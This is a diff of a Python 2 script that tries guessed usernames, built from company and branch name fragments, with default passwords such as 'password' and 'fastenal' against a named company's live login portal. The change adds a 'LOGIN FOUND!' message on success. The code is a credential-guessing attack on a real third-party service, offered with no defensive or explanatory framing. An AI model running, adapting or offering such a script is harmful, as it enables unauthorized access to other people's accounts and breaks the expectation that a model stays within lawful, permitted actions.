@@ -5,7 +5,7 @@ import itertools
 import sys
 
 passwords = ['password', 'fastenal']
-fiver = ['FLSAR']
+fiver = ['FLEDG']
 filler = ['Fastenal', 'Fast', 'Branch', 'Store']
 
 def combo(list1, list2):
@@ -25,4 +25,5 @@ for u in usernames:
         request = s.post('https://fastsolutions.mroadmin.com/APEX-Login/account_login.action', data=login)
         soup = BeautifulSoup.BeautifulSoup(request.content)
         if not soup.find('font', {'color': 'red'}):
+            print 'LOGIN FOUND!'
             sys.exit()
